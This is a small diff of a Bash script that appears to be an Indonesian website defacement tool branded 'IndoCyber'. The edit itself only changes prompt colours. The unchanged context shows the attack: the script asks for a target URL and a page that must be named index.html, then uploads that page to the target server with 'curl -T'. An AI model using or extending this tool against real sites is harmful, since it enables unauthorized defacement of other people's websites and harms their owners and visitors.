@@ -49,8 +49,8 @@ echo $red "Eksekusi Taarget!!!"
 echo $green "╭─"$blue"Chemod@zrd404"$cyan" ~/IndoCyber"$white
 read -p " ╰─$ "  target
 echo
-echo $green "Masukan Script !!!! "
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Nama SC Harus(index.html)"$white
+echo $red "Masukan Script!!! "
+echo $green "╭─"$blue"Chemod@zrd404"$cyan" ~/Nama SC Harus(index.html)"$white
 read -p " ╰─$ "  script
 curl -T /storage/emulated/0/$script $target
 echo $red "[+]>>>>> = $target"
